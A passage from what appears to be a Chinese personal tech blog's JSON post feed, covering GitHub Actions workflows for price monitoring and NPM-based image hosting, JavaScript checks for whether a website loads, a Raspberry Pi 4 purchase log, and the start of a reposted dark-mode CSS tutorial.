class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a 